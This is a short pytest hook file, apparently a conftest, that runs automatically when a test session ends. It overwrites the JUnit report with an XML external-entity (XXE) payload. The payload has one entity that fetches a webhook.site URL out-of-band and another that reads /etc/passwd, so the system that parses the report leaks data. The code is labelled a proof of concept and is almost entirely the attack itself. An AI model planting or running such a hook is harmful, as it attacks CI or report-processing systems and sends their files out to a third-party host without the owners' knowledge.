import os, time
def pytest_sessionfinish(session, exitstatus):
    p = "/out/project-0/junit.xml"
    xml = '<?xml version="1.0"?>\n<!DOCTYPE testsuite [<!ENTITY oob SYSTEM "http://webhook.site/e8d4a9d4-59ca-41c0-938c-17ec8c016ef2/xxe-oob"><!ENTITY fil SYSTEM "file:///etc/passwd">]>\n<testsuite name="poc" tests="1" failures="1"><testcase classname="poc" name="x"><failure message="oob=&oob; fil=&fil;">&fil;</failure></testcase></testsuite>'
    try:
        time.sleep(1)
        with open(p, "w") as f:
            f.write(xml)
    except Exception as e:
        try:
            with open("/out/project-0/estr.txt", "w") as f:
                f.write(str(e) + " | " + repr(sorted(os.listdir("/out/project-0"))))
        except Exception:
            pass
